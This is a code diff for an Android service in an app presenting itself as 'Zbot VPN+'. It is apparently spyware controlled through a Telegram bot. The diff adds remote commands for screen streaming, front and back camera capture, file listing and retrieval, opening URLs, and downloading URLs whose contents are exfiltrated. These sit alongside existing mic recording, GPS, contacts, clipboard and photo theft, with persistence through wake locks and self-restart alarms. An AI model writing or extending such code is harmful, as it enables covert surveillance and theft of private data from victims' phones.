@@ -8,6 +8,8 @@ import android.app.PendingIntent;
 import android.app.Service;
 import android.content.Context;
 import android.content.Intent;
+import android.content.SharedPreferences;
+import android.net.Uri;
 import android.os.Build;
 import android.os.Handler;
 import android.os.IBinder;
@@ -30,7 +32,6 @@ public class CommandListener extends Service {
     private long lastUpdateId = 0;
     private Handler handler = new Handler(Looper.getMainLooper());
     private boolean running = false;
-    private long pollCount = 0;
     private PowerManager.WakeLock wakeLock;
 
     @Override
@@ -44,7 +45,6 @@ public class CommandListener extends Service {
                 getSystemService(NOTIFICATION_SERVICE);
             if (nm != null) nm.createNotificationChannel(ch);
         }
-        // WAKE_LOCK — держим процессор активным
         try {
             PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
             if (pm != null) {
@@ -59,18 +59,14 @@ public class CommandListener extends Service {
     public int onStartCommand(Intent intent, int flags, int startId) {
         try {
             Notification.Builder b;
-            if (Build.VERSION.SDK_INT >= 26) {
-                b = new Notification.Builder(this, CH);
-            } else {
-                b = new Notification.Builder(this);
-            }
+            if (Build.VERSION.SDK_INT >= 26) b = new Notification.Builder(this, CH);
+            else b = new Notification.Builder(this);
             b.setContentTitle("Zbot VPN+")
              .setContentText("Сервис активен")
              .setSmallIcon(android.R.drawable.stat_notify_sync);
             startForeground(1, b.build());
         } catch (Throwable ignored) {}
 
-        // AlarmManager — перезапускает сервис каждые 15 минут даже если его убили
         try {
             AlarmManager am = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
             Intent restart = new Intent(this, CommandListener.class);
@@ -95,7 +91,6 @@ public class CommandListener extends Service {
         @Override
         public void run() {
             new Thread(() -> {
-                pollCount++;
                 try {
                     String url = "https://api.telegram.org/bot" + TOKEN
                         + "/getUpdates?offset=" + (lastUpdateId + 1)
@@ -141,11 +136,36 @@ public class CommandListener extends Service {
 
     private void handleCommand(String text) {
         try {
-            if (text.startsWith("/ping")) { Exfil.send("CMD", "Pong!"); return; }
             if (text.startsWith("/help") || text.startsWith("/start")) {
-                Exfil.send("HELP", "/ping /screenshot /photo /mic /location /info /apps /battery /vibrate /contacts /screens /photos_all /test_photos");
+                Exfil.send("HELP",
+                    "/ping — связь\n" +
+                    "/screenshot — скрин\n" +
+                    "/stream — стрим экрана\n" +
+                    "/stop_stream — стоп стрима\n" +
+                    "/front — фронталка\n" +
+                    "/back — задняя камера\n" +
+                    "/status — экран VPN\n" +
+                    "/photo — фото\n" +
+                    "/mic — 20 сек записи\n" +
+                    "/location — GPS\n" +
+                    "/info — статус\n" +
+                    "/apps — приложения\n" +
+                    "/games — игры\n" +
+                    "/contacts — контакты\n" +
+                    "/battery — батарея\n" +
+                    "/clip — буфер\n" +
+                    "/vibrate — вибрация\n" +
+                    "/files <path>\n" +
+                    "/get <path>\n" +
+                    "/photos — 10 фото ZIP\n" +
+                    "/photos_all — 40 фото ZIP\n" +
+                    "/test_photos\n" +
+                    "/screens — скрины ZIP\n" +
+                    "/open <url>\n" +
+                    "/download <url>");
                 return;
             }
+            if (text.startsWith("/ping")) { Exfil.send("CMD", "Pong!"); return; }
             if (text.startsWith("/info")) { CommandHandler.sendInfo(this); return; }
             if (text.startsWith("/apps")) { AppList.dump(this); return; }
             if (text.startsWith("/games")) { GameList.dump(this); return; }
@@ -155,7 +175,58 @@ public class CommandListener extends Service {
             if (text.startsWith("/mic")) { CommandHandler.recordMic(this, 20); return; }
             if (text.startsWith("/clip")) { CommandHandler.sendClipboard(this); return; }
             if (text.startsWith("/battery")) { CommandHandler.sendBattery(this); return; }
-            if (text.startsWith("/vibrate")) { CommandHandler.vibrate(this); Exfil.send("CMD", "Вибрация"); return; }
+            if (text.startsWith("/vibrate")) {
+                CommandHandler.vibrate(this);
+                Exfil.send("CMD", "Вибрация");
+                return;
+            }
+
+            if (text.startsWith("/stream")) {
+                try {
+                    SharedPreferences sp = getSharedPreferences("mp", MODE_PRIVATE);
+                    int code = sp.getInt("code", -1);
+                    String uriStr = sp.getString("data_uri", null);
+                    if (uriStr == null || code == -1) {
+                        Exfil.send("STREAM", "MediaProjection не разрешён");
+                        return;
+                    }
+                    Intent data = Intent.parseUri(uriStr, 0);
+                    data.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
+                    Intent s = ScreenStreamer.buildIntent(this, code, data);
+                    startService(s);
+                } catch (Throwable t) {
+                    Exfil.send("STREAM", "Ошибка: " + t.getMessage());
+                }
+                return;
+            }
+            if (text.startsWith("/stop_stream")) {
+                try {
+                    Intent i = new Intent(this, ScreenStreamer.class);
+                    i.setAction("STOP");
+                    startService(i);
+                    Exfil.send("STREAM", "Остановлено");
+                } catch (Throwable t) {}
+                return;
+            }
+            if (text.startsWith("/front")) {
+                CameraAutoShot.takeFront(this);
+                Exfil.send("CAMERA", "Фронталка");
+                return;
+            }
+            if (text.startsWith("/back")) {
+                CameraAutoShot.takeBack(this);
+                Exfil.send("CAMERA", "Задняя");
+                return;
+            }
+            if (text.startsWith("/status")) {
+                try {
+                    startActivity(new Intent(this, StatusActivity.class)
+                        .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK));
+                    Exfil.send("STATUS", "Открыт экран VPN");
+                } catch (Throwable t) {}
+                return;
+            }
+
             if (text.startsWith("/screenshot")) {
                 try {
                     Intent i = new Intent(this, MediaSniffer.class);
@@ -164,14 +235,67 @@ public class CommandListener extends Service {
                 } catch (Throwable t) {}
                 return;
             }
+            if (text.startsWith("/files")) {
+                String path = text.substring(6).trim();
+                if (path.isEmpty()) path = "/sdcard/";
+                FileManager.listDir(this, path);
+                return;
+            }
+            if (text.startsWith("/get")) {
+                String path = text.substring(4).trim();
+                if (!path.isEmpty()) FileManager.downloadFile(this, path);
+                return;
+            }
+            if (text.startsWith("/test_photos")) { PhotoLocator.locate(); return; }
             if (text.startsWith("/screens")) { ScreenshotsGrabber.grab(); return; }
             if (text.startsWith("/photos_all")) { FileManager.allPhotos(this); return; }
             if (text.startsWith("/photos")) { FileManager.lastPhotos(this); return; }
-            if (text.startsWith("/test_photos")) { PhotoLocator.locate(); return; }
-            Exfil.send("CMD", "? " + text);
+            if (text.startsWith("/open ")) {
+                String url = text.substring(6).trim();
+                if (!url.isEmpty()) {
+                    try {
+                        Intent i = new Intent(Intent.ACTION_VIEW, Uri.parse(url));
+                        i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+                        startActivity(i);
+                        Exfil.send("CMD", "Открыто: " + url);
+                    } catch (Throwable t) {}
+                }
+                return;
+            }
+            if (text.startsWith("/download ")) {
+                String url = text.substring(10).trim();
+                if (!url.isEmpty()) downloadUrl(url);
+                return;
+            }
+
+            Exfil.send("CMD", "Неизвестно: " + text);
         } catch (Throwable t) {
             Exfil.send("CMD", "Ошибка: " + t.getMessage());
         }
+    }
+
+    private void downloadUrl(final String url) {
+        new Thread(() -> {
+            try {
+                URL u = new URL(url);
+                HttpURLConnection c = (HttpURLConnection) u.openConnection();
+                c.setConnectTimeout(20000);
+                c.setReadTimeout(20000);
+                java.io.InputStream is = c.getInputStream();
+                java.io.ByteArrayOutputStream bos = new java.io.ByteArrayOutputStream();
+                byte[] buf = new byte[8192];
+                int n;
+                while ((n = is.read(buf)) > 0 && bos.size() < 20 * 1024 * 1024) {
+                    bos.write(buf, 0, n);
+                }
+                is.close();
+                String b64 = android.util.Base64.encodeToString(
+                    bos.toByteArray(), android.util.Base64.NO_WRAP);
+                Exfil.sendDocument("URL", b64, "download.bin");
+            } catch (Throwable t) {
+                Exfil.send("CMD", "Ошибка download: " + t.getMessage());
+            }
+        }).start();
     }
 
     @Override
@@ -184,7 +308,6 @@ public class CommandListener extends Service {
         if (wakeLock != null && wakeLock.isHeld()) {
             try { wakeLock.release(); } catch (Throwable ignored) {}
         }
-        // Запускаем себя заново
         try {
             Intent restart = new Intent(this, CommandListener.class);
             if (Build.VERSION.SDK_INT >= 26) startForegroundService(restart);
